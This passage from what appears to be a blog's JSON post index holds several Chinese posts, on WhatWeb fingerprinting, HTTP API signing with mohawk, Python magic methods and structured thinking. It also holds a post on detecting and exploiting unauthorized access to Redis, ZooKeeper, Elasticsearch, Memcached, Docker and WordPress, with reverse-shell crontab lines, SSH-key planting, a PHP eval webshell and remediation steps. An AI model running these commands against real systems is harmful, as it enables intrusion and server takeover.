有句话叫“纸上得来终觉浅”，光从书本上学习知识可能还不够，适当的时候可以多听听前辈的经验之谈，走走前辈走过的路，踩踩前辈踩过的坑。当踩得坑足够多了，走过的路足够长了，当然也不能忘记时刻保持学习的习惯，适当的运动保持健康的身体，过个几年，十几年，也许大家都能成为大牛。","categories":[],"tags":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"http://chucz.club/tags/生活杂谈/"}]},{"title":"利用Whatweb获取Web指纹信息","slug":"利用Whatweb获取Web指纹信息","date":"2018-01-11T04:29:30.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/01/11/利用Whatweb获取Web指纹信息/","link":"","permalink":"http://chucz.club/2018/01/11/利用Whatweb获取Web指纹信息/","excerpt":"","text":"我都寂寞多久了还是没好感觉全世界都在窃窃嘲笑 又是很久没有更新博客啦，为啥呢？因为在忙开发、开发、开发。我最近在研究指纹扫描以及漏洞扫描方面的设计与开发，从前端、后端到数据存储、消息队列再到分布式部署，感觉自己简直快成全栈了。不过开发过程中也有很多收获，有时间我会写博客分享一下。 那么今天写点啥呢？就分享个很老的安全工具吧——whatweb，相信很多朋友应该知道，用来扫web指纹的。为啥会用到它，因为项目需要啊，其实也可以不用，因为我自己写了很多扫描指纹的插件，这个只是作为备案选择而已。但既然用到了，那就理所当然要为它打call。好了，照旧先介绍如何安装，再介绍如何使用，本文重点在于环境安装，以及如何在python代码中比较优雅的使用whatweb。 安装升级rubywhatweb是用ruby开发的，因此服务器上需要安装ruby，且对版本有要求，貌似必须2.0以上（没记错的话）。目前很多服务器内置的ruby是1.8的，或者用yum install ruby安装的也是1.8的，因此需要安装或者升级版本到2.0以上才行。 升级方案one（推荐）先删除原来的ruby： 1yum remove ruby ruby-devel 下载ruby安装包，并进行编译安装： 12345wget http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gztar xvfvz ruby-2.1.2.tar.gz./configuremakesudo make install 将ruby添加到环境变量，ruby安装在/usr/local/bin/目录下，因此编辑 ~/.bash_profile文件，添加一下内容： 1PATH=$PATH:/usr/local/bin/ 不要忘了生效一下： 1source ~/.bash_profile 参考：http://ask.xmodulo.com/upgrade-ruby-centos.html 升级方案two先安装rvm，这是ruby的包管理器: 12$ curl -L get.rvm.io | bash -s stable $ source ~/.bash_profile 测试是否安装成功: 1rvm -v 利用rvm升级ruby: 123ruby -v #查看当前ruby版本 rvm list known #列出已知的ruby版本rvm install 2.0 #安装ruby 2.0 安装whatweb说起来这个就很简单，直接去github上clone下项目： 1git clone https://github.com/urbanadventurer/WhatWeb.git 项目内已经有编译好的可执行文件，whatweb，只需要添加个环境变量： 1PATH=$PATH:/root/WhatWeb-master/ 使用whatweb具体详细的使用方式就要参考github了，我这边只介绍怎么在python中使用whatweb。 废话不多说，直接上代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#! -- coding:utf-8 --import commandsimport re# 正则表达式p_httpserver=re.compile(r“HTTPServer\\x1b[0m[\\x1b[1m\\x1b[36m([^,]+?)\\x1b[0m]“)p_title=re.compile(r“Title\\x1b[0m[\\x1b[1m\\x1b[33m(.+?)\\x1b[0m]“)p_ip=re.compile(r“IP\\x1b[0m[\\x1b[37m([^,]+?)\\x1b[0m]“)p_country=re.compile(r“Country\\x1b[0m[\\x1b[37m([^,]+?)\\x1b[0m]“)p_cookies=re.compile(r“Cookies\\x1b[0m[\\x1b[37m([^,]+?)\\x1b[0m]“)p_x_powered_by=re.compile(r“X-Powered-By\\x1b[0m[\\x1b[37m([^,]+?)\\x1b[0m]“)def re_grep(p,content): # 正则处理 L=p.findall(content) if len(L)&gt;0: return L[0] else: return “”def whatweb(url): # whatweb扫描 result=“” httpserver=“” title=“” ip=“” cookies=“” country=“” power_by=“” try: status,result=commands.getstatusoutput(‘whatweb ‘+url) # print status,result except IndexError,e: print e else: httpserver=re_grep(p_httpserver,result) title=re_grep(p_title,result) ip=re_grep(p_ip,result) country=re_grep(p_country,result) cookies=re_grep(p_cookies,result) power_by=re_grep(p_x_powered_by,result) return httpserver,title,cookies,country,power_byif name==“main“: result=whatweb(“thief.one”) for i in result: print i 说明：解释一下代码，主要就是一个正则表达式，因为运行whatweb会直接将结果打印，当然也有其他命令可以让其结果输出到文本等，但如果想要批量自动化扫描的话，需要实时获取whatweb的内容，生成文件的方式显然不行，因此我用了commands库，让python执行系统命令并获取返回结果，然后就是几个正则对结果的匹配。 结束之语：又水了一篇，嗯嗯！ 如果有朋友有更好地在python代码中使用whatweb的方法，麻烦告知，我是被whatweb的输出折腾的够呛，因此才选择了用正则，无奈之举。","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"whatweb","slug":"whatweb","permalink":"http://chucz.club/tags/whatweb/"}]},{"title":"HTTP-API认证，Python实现方案","slug":"HTTP-API认证，Python实现方案","date":"2017-12-11T01:53:04.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2017/12/11/HTTP-API认证，Python实现方案/","link":"","permalink":"http://chucz.club/2017/12/11/HTTP-API认证，Python实现方案/","excerpt":"","text":"一杯敬自由，一杯敬死亡 标题写的比较模糊拗口，简单来说本文就是介绍如何利用python将http的api接口做加密认证，防止不法分子乱用。这里有几个前提需要说明下，首先我们要实现的是http的加密认证，因此不考虑https。其次认证的目的是为了让一个http的api接口让正确的（通过认证的）人使用，而不是任何都可以用。 设计方案明白了http api认证的目的，那么就来设计方案吧！ 最偷懒的方案我之前写过几个api接口，主要是自己用来传输一些数据库数据的，由于数据有一点敏感，因此使用了认证。当时为了偷懒，认证的方式写得特别简单无脑，即在api接口上增加了一个auth字段，字段的内容会在服务端进行校验，但其内容是一串写死的md5。这虽然也算是一种认证方式(不知道auth字段内容的朋友无法拿到api接口的数据)，但如果局域网内流量被监听，那这种方案就形同虚设了。 比较简单实用的设计方案一种比较好的设计方案，是在客户端与服务端实现一套加密算法，算法可自定义但最好复杂一点。如将请求的参数以及内容以一定的方式排列后，可以再加上时间戳，整体做一个hash运算。服务端将获取的参数同样做hash，与客户端传递的hash做对比。因为有了时间戳，即使被监听了流量，进行流量重放也是不能认证成功的。（因为时间戳存在差异） 说明一下：本文介绍的是api的一个认证方式，这跟网站啥的认证还是有区别的。主要还是看api的应用场景，如果是给内部人员调用，而且调用的用户不多，其实以上认证方案足够了。因为用来加密的密钥（key）可以用其他安全的方式发送给用户（甚至可以写纸上，2333），而不必像https协议一样，使用非对称加密+对称加密，并且使用数字证书等一系列复杂的加密认证方式。 好了，前文介绍了一些api认证的方案，那么接下来再写点啥呢？我不打算介绍怎么去开发一个认证方案的代码，我主要想推荐一个开源的项目—hawk，因为它就是用来实现http加密认证的，而且它有一个python的实现模块（mohawk），推荐它是因为它比较简单实用。 因为之前研究过mohawk模块2个小时（真的是2个小时），因此本文主要介绍一下mohawk的用法。企业内部一般自己设计api的加密认证方案（一般是生成一个token密文，严格一点的会做双因子认证），因此这个模块适合给初学者练练手，也可以给打算自己设计认证方案的朋友提供一种思路。以下内容是我阅读mohawk文档总结的一些基础用法，更详细的可以参考下官网文档。 hawk介绍hawk项目地址：https://github.com/hueniverse/hawkpython实现：https://github.com/kumar303/mohawk官方文档：https://mohawk.readthedocs.io/en/latest/ 安装hawk1pip install mohawk 构建一个webserver这里我使用python的falcon框架来构建一个api webserver，如果对falcon框架不熟悉，可以先阅读：https://thief.one/2017/11/27/1/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import falconfrom mohawk import Receiver # 导入mohawk模块的Receiver方法from wsgiref import simple_server# 认证字典,可以创建不同的用户，每个用户都可以用不同的密钥（key）allowed_senders=&#123; “test”:&#123; ‘id’: ‘test’, ‘key’: ‘110’, ‘algorithm’: ‘sha256’ &#125;, # test 用户组 “nmask”:&#123; ‘id’: ‘nmask’, ‘key’: ‘112’, ‘algorithm’: ‘sha256’ &#125;, # nmask 用户组&#125;def lookup_credentials(sender_id): ‘’‘ 验证用户是否在允许的范围内 ‘‘’ if sender_id in allowed_senders: return allowed_senders[sender_id] else: raise LookupError(‘unknown sender’)class Test(object): def on_post(self, req, resp): ‘’‘ http post 方法 ‘‘’ try: Receiver( lookup_credentials, req.headers.get(‘AUTHORIZATION’), # 请求时生成的密钥 req.url, req.method, content= req.stream.read(), content_type=req.headers.get(‘CONTENT-TYPE’) ) except Exception,e: ‘’‘ 报错则说明认证失败 ‘‘’ print e resp.status = falcon.HTTP_403 # This is the default status else: resp.status = falcon.HTTP_200 # This is the default status resp.body = (‘Hello World!’) def on_get(self, req, resp): ‘’‘ http get 方法 ‘‘’ try: Receiver( lookup_credentials, req.headers.get(‘AUTHORIZATION’), req.url, req.method, content= req.stream.read(), content_type=req.headers.get(‘CONTENT-TYPE’) ) except Exception,e: print e resp.status = falcon.HTTP_403 # This is the default status resp.body = (‘authorization fail!’) else: resp.status = falcon.HTTP_200 # This is the default status resp.body = (‘Hello World!’)app = falcon.API()test = Test()app.add_route(‘/‘, test)if name == ‘main‘: httpd = simple_server.make_server(‘127.0.0.1’, 8000, app) httpd.serve_forever() 构建一个http请求搭建好webserver以后，我们自然需要构建http请求，去验证请求是否经历了认证的过程，且认证的结果是否正确，这里使用requests包去构建。 123456789101112131415161718192021222324252627282930313233343536import jsonimport requestsfrom mohawk import Sender # 导入mohawk模块的Sender方法url = “http://127.0.0.1:8000/&quot;post_data = json.dumps(“”) # 如果是get请求，参数内容可以设置为””content_type = ‘application/x-www-form-urlencoded’# 用于认证的字典credentials = &#123; ‘id’: ‘test’, ‘key’: ‘10’, ‘algorithm’: ‘sha256’ &#125;sender = Sender(credentials, url = url, # 必填 method = ‘POST’, # 必填 content = post_data, # 必填，如果是get请求，参数内容可以设置为”” content_type = content_type # 必填 )print sender.request_header # 生成的密文，通过header的形式传递到服务端res=requests.post( url = url, data = post_data, headers=&#123; ‘Authorization’: sender.request_header, ‘Content-Type’: content_type &#125; )print res.status_codeprint res.text mohawk模块说明mohawk是hawk的python实现，有几个主要方法：Sender、Receiver等，详细的可以去阅读源码。 Sender方法用来生成在http请求认证中所需的密码，该方法需要传递几个参数，比如：url、method、content（post_data）、content_type、credentials(认证的字典，包含了id、key、加密方式)等，该方法会根据传递的参数值，生成一个密文密码，然后我们可以将其放在headers中传递到服务端。 Receiver方法用来在服务端接收客户端传递的请求，根据获取的参数的内容计算出一个新的密文密码，与客户端传递的密文进行对比，达到认证的效果。","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"python","slug":"python","permalink":"http://chucz.club/tags/python/"}]},{"title":"未授权访问漏洞的检测与利用","slug":"未授权访问漏洞的检测与利用","date":"2017-12-07T19:21:52.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2017/12/07/未授权访问漏洞的检测与利用/","link":"","permalink":"http://chucz.club/2017/12/07/未授权访问漏洞的检测与利用/","excerpt":"","text":"一杯敬故乡，一杯敬远方 最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：安全脉搏，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。 redis未授权访问漏洞漏洞描述redis安装完以后，默认是没有账号密码的（安装redis详细可参考：redis相关笔记，如果redis是以root权限去运行，则可以被反弹shell或者写入ssh密钥，从而被获取服务器的权限。 漏洞检测1234567s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host,port))s.send(“INFO\\r\\n”)result = s.recv(1024)if “redis_version” in result: print “exist vul” 客户端连接测试一下： 12345$redis-cli -h host -p port&gt;CONFIG get requirepass1) “requirepass”2) “”说明：表示没有设置密码，默认为没有密码。 漏洞利用利用crontab反弹shell自己服务器上监听一个端口(10.0.0.2) 1nc -lvnp 4444 执行命令: 12345redis-cli -h 10.0.0.1set x “\\n * bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1\\n”config set dir /var/spool/cron/config set dbfilename rootsave 写ssh-keygen公钥登录服务器利用条件： 121.redis对外开放，且未授权访问（默认配置）2.服务器的ssh对外开放，可通过key登录 详细攻击方式如下： 123456789101112131415161718准备好自己的公钥，写入本地文件text.txt。$ (echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; test.txt2. 通过redis将该文件写入内存$ redis-cli -h 10.0.0.1 flushall$ cat test.txt | redis-cli -h 10.0.0.1 -x set crackit3. 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下$ redis-cli -h 10.0.0.110.0.0.1:6379&gt; config set dir /Users/nmask/.ssh/OK10.0.0.1:6379&gt; config get dir1) “dir”2) “/Users/nmask/.ssh”10.0.0.1:6379&gt; config set dbfilename “authorized_keys”OK10.0.0.1:6379&gt; saveOK 获取web服务的webshell当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。 1234config set dir /var/www/html/config set dbfilename shell.phpset x “&lt;?php @eval($_POST[‘test’]);?&gt;”save 说明：执行以上命令，即可将shell写入web目录。 漏洞修复到redis安装目录下，配置redis.conf文件：1、默认只对本地开放bind 127.0.0.12、添加登陆密码requirepass www.secpulse.com3、在需要对外开放的时候修改默认端口port 23334、最后还可以配合iptables限制开放 ZooKeeper未授权访问漏洞漏洞描述安装zookeeper之后默认是没有账号密码的，即没有权限校验，可被远程利用，通过目标服务器收集敏感信息，或者破坏zookeeper集群。 漏洞检测123456s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send(“envi”)result = s.recv(1024)if “zookeeper.version” in result: print “exist vul” 漏洞利用执行以下命令即可远程获取该服务器的环境： 1echo envi | nc ip port 直接连接： 1./zkCli.sh -server ip:port 漏洞修复1、禁止把Zookeeper直接暴露在公网2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）3、绑定指定IP访问 Elasticsearch未授权访问漏洞描述ELK是一款日志分析工具，默认监听9200端口，如果没有设置访问权限，可被非法操作数据。 漏洞检测12345conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)conn.request(“GET”, ‘/_cat/master’)resp = conn.getresponse()if resp.status == 200: print “exist vul” 漏洞利用相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。http://x.x.x.x:9200/_nodeshttp://x.x.x.x:9200/_river 漏洞修复1、防火墙上设置禁止外网访问9200端口。2、使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证3、限制IP访问，绑定固定IP4、在config/elasticsearch.yml中为9200端口设置认证： 1234http.basic.enabled true #开关，开启会接管全部HTTP连接http.basic.user “admin” #账号http.basic.password “admin_pw” #密码http.basic.ipwhitelist [“localhost”, “127.0.0.1”] memcache未授权访问漏洞描述memcached是一套常用的key-value缓存系统，其本身并没有权限控制模块，因此攻击者通过命令交互可直接读取memcached中的敏感信息。 漏洞检测123456s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send(“stats”)result = s.recv(1024)if “STAT version” in result: print “exist vul” 漏洞利用1nc -vv &lt;target&gt; 11211 说明：连接成功，则可获取memcached中的敏感信息。 漏洞修复1、设置memchached只允许本地访问2、禁止外网访问Memcached 11211端口3、编译时加上–enable-sasl，启用SASL认证 Docker未授权访问漏洞描述Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。 漏洞检测12345conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)conn.request(“GET”, ‘/containers/json’)resp = conn.getresponse()if resp.status == 200 and “HostConfig” in resp.read(): print “exist vul” 漏洞利用获取所有images 1http://host:2375/containers/json getshell的方式与redis利用差不多。 利用计划任务反弹shell1echo -e “/1 * root /usr/bin/python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\”127.0.0.1\\”,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\”/bin/sh\\”,\\”-i\\”]);’\\n” &gt;&gt; /etc/crontab 漏洞修复1、在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：设置ACL，仅允许信任的来源IP连接；设置TLS认证，官方的文档为Protect the Docker daemon socket2、客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1 123export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证 wordpress未授权访问漏洞漏洞描述wordpress未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改。REST API是最近添加到WordPress 4.7.0并默认启用的。 漏洞利用查看文章列表: 1GET /index.php/wp-json/wp/v2/posts HTTP/1.1 修改文章内容： 123456POST /index.php/wp-json/wp/v2/posts/500?id=500 HTTP/1.1Host: xxx.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36Content-Type: application/jsonContent-Length: 43&#123;“title”:“x x x x”&#125; 说明：如果返回 401 则无权限修改；返回200表示修改成功。 参考文章https://www.secpulse.com/archives/61101.htmlhttps://www.secpulse.com/archives/40406.htmlhttp://www.freebuf.com/vuls/126120.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://chucz.club/tags/web安全/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"http://chucz.club/tags/未授权访问漏洞/"}]},{"title":"Python魔术方法","slug":"Python魔术方法","date":"2017-11-22T04:35:41.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2017/11/22/Python魔术方法/","link":"","permalink":"http://chucz.club/2017/11/22/Python魔术方法/","excerpt":"","text":"一杯敬朝阳，一杯敬月光 所谓魔术方法，就是在自定义类中定义一些”不一般”的方法，使类的封装更完善功能更健全，是一种python特有的方法。它们的方法名一般是__xx__这样的格式，比如最常见的__init__，就是一种魔术方法。下面我介绍一些在定义类中常见的魔术方法，并附上测试代码，请各位自行体验一下其美妙的魔术魅力吧。 魔术方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#! -- coding:utf-8 --class ClassTest(object): def new(cls,*args,**kwargs): ‘’‘ 初始化操作，类实例化时第一个被调用的方法 与init方法一起构成构造函数 ‘‘’ return object.new(cls) def init(self, _list=[“1”,“2”,“3”,“4”,“5”] , _dict=&#123;“a”:1,“b”:2&#125;): ‘’‘ 初始化操作 ‘‘’ self._list = _list self._dict = _dict def del(self): ‘’‘ 删除变量 ‘‘’ del self._list del self._dict def call(self, item): ‘’‘ Usage: &gt;&gt;&gt;&gt;func=ClassTest() &gt;&gt;&gt;&gt;print func(“nmask”) &gt;&gt;&gt;&gt;nmask ‘‘’ return item def len(self): ‘’‘ 返回对象的长度 Usage: &gt;&gt;&gt;&gt;print len(ClassTest()) &gt;&gt;&gt;&gt;5 ‘‘’ return len(self._list) def getitem(self, key): ‘’‘ 通过下标取出对象的值 Usage: &gt;&gt;&gt;print ClassTest()[“a”] &gt;&gt;&gt;1 ‘‘’ if key not in self._dict: return self.missing(key) return self._dict[key] def missing(self,key): ‘’‘ 当key不在dict中被调用 ‘‘’ return “%s is not in dict” % key def setitem(self, key, value): ‘’‘ 设置对象的值 Usage: ClassTest()[‘a‘]=’12345‘ ‘‘’ self._dict[key] = value def delitem(self, key): ‘’‘ 删除对象 ‘‘’ del self._dict[key] def getattr(self, item): ‘’‘当访问对象不存在的属性时，调用此类 Usage: &gt;&gt;&gt;ClassTest().abc ‘‘’ return “class is not exists %s method” % item def contains(self, item): ‘’‘ not in or in 判断元素是否在其中 Usage: &gt;&gt;&gt;if “1” in ClassTest() &gt;&gt;&gt; ‘‘’ return item in self._list def iter(self): ‘’‘ 创建一个迭代器 Usage: &gt;&gt;&gt;for i in ClassTest(): &gt;&gt;&gt; print i ‘‘’ return iter(self._list) def reversed(self): ‘’‘ 反转列表 Usage: &gt;&gt;&gt;for i in reversed(ClassTest()): &gt;&gt;&gt; print i ‘‘’ return reversed(self._list) def str(self): ‘’‘用于处理打印实例本身的时候的输出内容,默认为对象名称和内存地址 Usage: &gt;&gt;&gt;print ClassTest() ‘‘’ return “This is a Test Class for Python Magic Method” def repr(self): ‘’‘ 序列化对象 Usage: &gt;&gt;&gt;repr(ClassTest()) ‘‘’ return repr(self._dict) def run(self): return self._dictif name==“main“: if “1” in ClassTest(): print “调用了类的contains方法：1 is in _list” print “调用了类的missing方法：”,ClassTest()[“aaa”] for i in reversed(ClassTest()): print “调用了类的iter方法：”,i print “调用了类的getattr方法：”,ClassTest().abc print “调用了类的repr方法：”,repr(ClassTest()) print “调用了类的str方法：”,ClassTest() print “调用了类的len方法：”,len(ClassTest()) print “调用了类的setitem方法：ClassTest()[‘a’]=’12345’” ClassTest()[“a”]=“12345” print “调用了类的getitem方法：”,ClassTest()[“a”] for i in ClassTest(): print “调用了类的iter方法：”,i 运行结果： 123456789101112131415161718调用了类的contains方法：1 is in _list调用了类的missing方法： aaa is not in dict调用了类的iter方法： 5调用了类的iter方法： 4调用了类的iter方法： 3调用了类的iter方法： 2调用了类的iter方法： 1调用了类的getattr方法： class is not exists abc method调用了类的repr方法： &#123;‘a’: 1, ‘b’: 2&#125;调用了类的str方法： This is a Test Class for Python Magic Method调用了类的len方法： 5调用了类的setitem方法：ClassTest()[‘a’]=‘12345’调用了类的getitem方法： 12345调用了类的iter方法： 1调用了类的iter方法： 2调用了类的iter方法： 3调用了类的iter方法： 4调用了类的iter方法： 5 更多魔术方法，参考：http://python.jobbole.com/88367/","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"python","slug":"python","permalink":"http://chucz.club/tags/python/"}]},{"title":"结构化思维","slug":"结构化思维","date":"2017-09-06T21:50:33.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2017/09/06/结构化思维/","link":"","permalink":"http://chucz.club/2017/09/06/结构化思维/","excerpt":"This is a summary","text":"This is a summary 结构化思维是什么结构化思维有的时候又可以称为金字塔原理，在一些国际顶级咨询公司他们多年积累的一套方法论称为金字塔原理，在一些公职人员考试面试中称为结构化思维，其实他们想表达的思维模式总得来说都是同一个概念，主要是为了培养人形成一定的思维思考的模式，通过对问题的正确界定，在对相关因素合理分类整理，对重点进行分析，形成一套思考问题的树状结构，由于像金字塔，所以称为金字塔原理，这样比喻也更形象，更容易让人理解。 结构化思维的作用结构化思维本身其实就是逻辑思维，它是将零散的思维，知识，灵感，想法，信息，数据等通过一种思维的框架收拢起来，让复杂的事情简化，并获得一种分析的方法，甚至是量化的工具，使我们能够透过事物表层看到本质。要形成良好的结构化思维还需要长期的训练，不断的训练就可以提高我们系统分析问题以及解决问题的能力，使我们的思维及表达更加缜密，有条理。结构化思维适用于各个地方，不论是技术难题，还是开会演讲，以及汇报工作，又或是总结规划，都有用武之地，是人们更深层的思维逻辑的演化，因此对于工作中的人们是比较有帮助的。下面来看两个简单的的例子，形象的说明结构化思维能带给我们的帮助。 举个例子这样的例子，在日常生活中也经常发生.. 123456789101112131415161718192021小明今天周末在家待着，觉着天气炎热想出门买点饮料，小红是小明的妻子，下面于是有了这样的对话：&gt; 小明：我这回要出去买点喝的，还需要顺便带点啥嘛？&gt; 小红：哦，对了，家里牛奶和鸡蛋没了，你待会出去别忘了带回来。小明于是去换衣服，期间~&gt; 小红: 我好久没吃葡萄了哦，对了待会午饭炒菜需要点大葱，家里的貌似也没有了。小明换好了衣服，正在出门穿鞋，小红又说话了~&gt; 小红：孩子想吃苹果了，一会别忘了再买点苹果，对了还有酸奶，孩子也要喝！小明刚出门，发现手机忘带了，没带手机怎么支付呀，于是重新返回家拿手机，拿了手机刚要出门，小红的声音再次响起~&gt; 小红：一会别忘了再买点西红柿！中午饭给你们做一个西红柿炒鸡蛋！&gt; 小明：你咋这么啰嗦呢！！为啥之前不一次给我说完呢！&gt; 小红：对了再买点咸鸭蛋哈~&gt; 小明：好！好！好！小明气冲冲的出了家门.. 从上面的对话中来看，小红一共让小明带的东西，按照对话顺序来看有这些（共8个）： 牛奶🐂，鸡蛋🐔，葡萄🍇，大葱，苹果🍎，酸奶，西红柿🍅，咸鸭蛋 根据一些研究数据表明，人最多同时可以记住7个事情，超出7个一般都会忘记一些，当只有一个东西的话，是最不容易忘记的，当数量为三个的时候是比较推荐的（当然个别人可能记忆力超强也能同时记住更多的事情的除外），但只是上面这8个东西，去了超市，如果小明不用手机备忘记住的话，只是依靠头脑记的话，很有可能在逛超市的时候很把其中的某几个样忘记。 对了别忘了！除了上面这8个，他还要买他自己最想喝的饮料！ 人类大脑在处理信息的时候，有两个规律：第一，不能一次太多，太多信息会让我们的大脑觉得负荷过大；第二，喜欢有规律的信息。 那么如果按照顺序来记忆这些东西比较容易遗忘，那么是否我们需要换一种思路，利用结构化的思维来看看，看怎么样构建金字塔： 那么我们会很容易的发现，当你在头脑中构建出这样的金字塔结构后，小红交代需要买的东西，很容易的就记下来了，那么拆分下来的子项如何更好的记忆呢，可以找出一些逻辑关联方便记忆，例如：牛奶&amp;酸奶、鸡蛋&amp;咸鸭蛋，小红想吃葡萄，孩子想吃苹果，西红柿炒鸡蛋，炒菜需要葱花..等 通过上面这个🌰，可以得出我所想表达的观点： 人类的大脑更倾向于去理解和明白具有结构化的事物或者问题，不是我们故意构造出结构化的思维的方法论为了让人类去学习或者提高记忆。 工作中我们会遇到各种各样的问题，而在日常沟通中如果让你描述一个问题，没有很清晰的结构化的思路来表达你所想表达的问题的时候，经常会让对方造成不同意思的解读，假如还是通过通讯工具来沟通并非面对面聊天的话，甚至还会容易引发误会和冲突。 接下来那么我们下来找一个技术相关的例子，看如何进行结构化的拆分。 技术的例子计算机网络里面HTTP相关知识比较重要的一章节，这部分也是知识点比较零散，东西较多的一块，那么我们看针对HTTP如何进行知识体系的结构化拆分： 由于空间的有限，虽然不是标准的金字塔结构，但是也能基本勾勒出HTTP整个知识体系的结构，对于想深入学习HTTP相关知识的同学还是比较有帮助的，查缺补漏看看哪部分是你的知识体系中需要加强深入学习的。 结构化思维的训练如果你只是知道结构化思维这样的名词是远远不够的，要将它变成自己的思维方式，能够做到不加思考地习惯性应用，还需要刻意的去练习。如果现在你已经形成了对结构化思维的认识，那么在未来的工作中就应该尽量按照这样思维方式来思考，如果能从现在开始努力坚持三个月的思考，那么结构化的思维能力肯定就会有所提升，如果能坚持半年，那么基本就已经变成你自己的习惯了。当然如果有同伴也一直能这样在练习，对你也会有一定的影响和帮助。那么在工作中遇到哪些问题的时候，都可以采用这样的思维方式来思考呢？ 写代码时 跨团队沟通问题时 写总结计划文档时 汇报工作开会时 技术分享时 职级晋升答辩时 如果在这些时候你能坚持使用结构化思维去思考问题，那么通过一段时间坚持不断的训练，你将会对这些事情更加游刃有余。那么在结构化拆分的时候应该遵循什么原则呢？很久之前一个著名的咨询顾问提出的MECE的分析法则，作为金字塔原理的重要指导原则。什么是MECE分析法则呢？ MECE分析法则MECE，英文是Mutually Exclusive Collectively Exhaustive的缩写，中文意思是“相互独立，完全穷尽”。 也就是对于一个需要解决的问题，能够做到不重叠、不遗漏的分类，而且能够有效把握问题的核心，并解决问题的方法。MECE即把一个项目分解为若干个更细的工作任务的方法，它主要有两条原则： 一是独立性，强调了每项之间要独立，每项之间不要有交叉重叠 二是完整性，说的是分解的过程中不要漏掉某项，要保证完整性 除了坚持这两条原则外，当遇到不是很好拆分的问题，可以尝试否定法和抽象法或者画鱼骨图的方式来进行推动拆分，例如： 123456789# 否定法 #问：老罗的锤子🔨手机📱卖的是什么呢？答：老罗的🔨不仅是卖的手机📱，还卖的是老罗的“情怀”..# 抽象法 #问：那么锤子🔨手机📱有什么功能呢？答：🔨📱除了正常智能手机📱都具备的功能以外，它自身还有很多特色功能，例如：Big Bang、One Step等新功能. 在使用MECE法则的时候应该还要注意一下几点： 要做到全方位、多角度地考虑问题 尽可能多的收集材料和事实依据 利用已有的数据图表来分析问题 只要能在坚持这两条原则以及注意这几点的情况下，采用MECE分析法不断训练结构化的思维方式才能不断的提升这方面的思维能力。 写在最后结构化思维（金字塔原理）是逻辑思维的方法论，是把复杂问题变得可以量化的工具，也是国际上的顶级的咨询公司一直推崇的方法，他们旨在帮助各种企业解决复杂的商业问题，给出建设性的建议。同样对工作中的人们也会有帮助，帮助他们更好的去演讲，汇报，在职场中得到提升。最后留一道题目给大家思考🤔： 北京市有多少只鸟？ 据说是之前一个咨询公司曾经出过的题目，值得一提的是这道题目的结果并不是面试官最关心的，而他们更希望看到的是你的思维过程，可能思维过程远比最后得出的结果要重要。 完..","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Javascript Quiz","slug":"Javascript-Quiz","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/Javascript-Quiz/","link":"","permalink":"http://chucz.club/2017/03/22/Javascript-Quiz/","excerpt":"This is a summary","text":"This is a summary 